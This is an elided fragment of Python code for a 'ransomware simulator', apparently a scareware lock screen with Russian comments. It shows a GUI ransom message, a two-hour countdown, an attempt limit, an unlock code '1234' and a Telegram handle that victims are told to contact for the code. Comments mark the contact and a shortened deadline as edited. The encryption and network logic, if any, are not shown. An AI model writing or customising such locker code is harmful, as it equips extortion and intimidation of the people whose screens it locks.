...
Telegram: @PixelCheatHacker | Время: 2 часа
Code: 1234
"""
...
TELEGRAM_CONTACT = "@PixelCheatHacker"  # ИЗМЕНЕНО
TIME_LIMIT_HOURS = 2  # ИЗМЕНЕНО: 45 часов → 2 часа
...
class GrifersRansomwareSimulator:
    def __init__(self):
        ...
        self.attempts = 0
        self.max_attempts = 5
        self.time_remaining = TIME_LIMIT_HOURS * 3600  # 2 часа в секундах
    ...
    def create_gui(self):
        ...
        # Основной текст (с новым Telegram)
...
У вас есть 2 часа с момента запуска чтобы ввести код. Чтобы получить код, напишите {TELEGRAM_CONTACT} (Telegram)"""
